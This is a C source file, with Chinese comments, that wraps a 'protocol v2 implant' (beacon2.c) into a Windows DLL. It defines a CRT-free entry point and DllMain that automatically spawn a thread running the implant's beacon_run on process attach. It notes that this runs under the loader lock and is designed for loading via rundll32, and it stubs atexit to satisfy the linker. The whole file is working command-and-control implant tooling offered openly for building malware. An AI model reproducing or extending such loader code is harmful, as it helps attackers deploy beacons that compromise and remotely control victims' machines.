/*
 * csdev :: beacon2_dll.c  --  beacon2 的 DLL 外壳
 * ==========================================================================
 * 用途: 把 beacon2.c (协议 v2 植入体) 编译成 DLL。
 *       beacon_run() 在 beacon2.c 中是全局符号, 因此这里直接 extern 引用,
 *       不修改 beacon2.c 一个字节。
 *
 * 与 CRT 的关系:
 *   生成器用 -shared -nostartfiles 链接, 所以 dllcrt2.o 不参与, 入口由
 *   -Wl,-e,_DllMainCRTStartup 指向本文件定义的 _DllMainCRTStartup。
 *   该入口不调用 CRT 初始化 (beacon2.c 只用 msvcrt 的格式化函数, 不需要
 *   初始化), 直接进入 DllMain。
 *
 * 执行模型:
 *   DllMain 在 loader lock 持有期间被调用, 所以植入体必须在独立线程里跑,
 *   否则 WinHTTP 的网络等待会卡死加载进程。
 * ==========================================================================
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

/* beacon2.c 的全局入口 (未经 static 修饰, 可跨编译单元引用) */
extern int beacon_run(void);

static DWORD WINAPI beacon_thread(LPVOID param)
{
    (void)param;
    beacon_run();
    return 0;
}

/* 由 PE 头 AddressOfEntryPoint 直接调用 */
BOOL WINAPI _DllMainCRTStartup(HINSTANCE inst, DWORD reason, LPVOID reserved)
{
    (void)inst;

    if (reason == DLL_PROCESS_ATTACH) {
        HANDLE h = CreateThread(NULL, 0, beacon_thread, NULL, 0, NULL);
        if (h) CloseHandle(h);
    }
    (void)reserved;
    return TRUE;
}

/* 同时提供标准名, 便于 loader / rundll32 的常规加载路径 */
BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved)
{
    return _DllMainCRTStartup(inst, reason, reserved);
}

/* 现代 MinGW-w64 (gcc 16.x MSVCRT) 的 libmingwex 会无条件引用 atexit,
 * 而 -nostartfiles 跳过了提供 atexit 的 CRT 启动对象, 于是 DLL 链接报
 * "undefined reference to `atexit'"。植入体 DLL 不需要 atexit 做退出清理,
 * 给一个空实现即可满足链接, 不改变任何运行时行为。 */
int atexit(void (*func)(void))
{
    (void)func;
    return 0;
}
